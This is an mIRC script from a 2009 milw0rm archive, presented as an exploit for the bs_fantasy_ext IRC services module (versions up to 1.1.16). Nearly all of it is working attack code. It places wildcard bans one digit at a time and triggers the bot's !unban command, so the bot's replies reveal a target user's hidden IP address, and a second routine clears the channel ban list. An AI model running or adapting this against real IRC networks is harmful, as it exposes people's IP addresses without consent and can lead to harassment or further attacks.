; bs_fantasy_ext <= 1.1.16 Exploit by Phil
; Kudos to MattT for pointing this out
; Only seems to work for non-vhosted unresolved IPs
; Code is a little inefficient, sorry.
; Usage: /getip <channel> <nickname> <bs bot nickname>
 
alias getip {
  if ($1 != $null && $2 != $null && $3 != $null) {
    set %exploit.channel $1
    set %exploit.nickname $2
    set %exploit.botnick $3
    set %exploit.prefix *!*@
    set %exploit.counter 1
 
    while (%exploit.counter <= 9) {
      mode %exploit.channel +b %exploit.prefix $+ %exploit.counter $+ *
      inc %exploit.counter
    }
 
    msg %exploit.channel !unban %exploit.nickname
  }
}
 
on 1:UNBAN:#:{
  if ($chan == %exploit.channel && $nick == %exploit.botnick) {
    set %exploit.prefix $left($banmask, $calc($len($banmask) - 1))
 
    set %exploit.counter 0
 
    unbanall %exploit.channel
 
    while (%exploit.counter <= 9) {
      mode %exploit.channel +b %exploit.prefix $+ %exploit.counter $+ *
      inc %exploit.counter
    }
 
    if ($right(%exploit.prefix, 1) != .) {
      mode %exploit.channel +b %exploit.prefix $+ . $+ *
    }
 
    msg %exploit.channel !unban %exploit.nickname
  }
}
 
; Following Code Taken From http://www.hawkee.com/snippet/1661/
alias unbanall {
  set %chan $iif($1,$1,$active)
  ;.timer 0 2 unbanallx
  unbanallx
}
 
alias unbanallx {
  mode  %chan +b
  if ($ibl(%chan,0)) {
    if (%chan ischan)  {
      if ($me isop %chan) || ($me ishop %chan) {
        ;mode %chan +b
        var %x $ibl(%chan,0)
        var %y 0
        while (%y <= %x) {
          var %banlist = $(%banlist,$ibl(%chan,%y))
          inc %y
        }
        mode %chan $+(-,$str(b,$ibl(%chan,0))) %banlist
      }
      else { echo -a ur not op in %chan }
    }
    else { echo -a ur not on %chan }
  }
}

; milw0rm.com [2009-01-08]
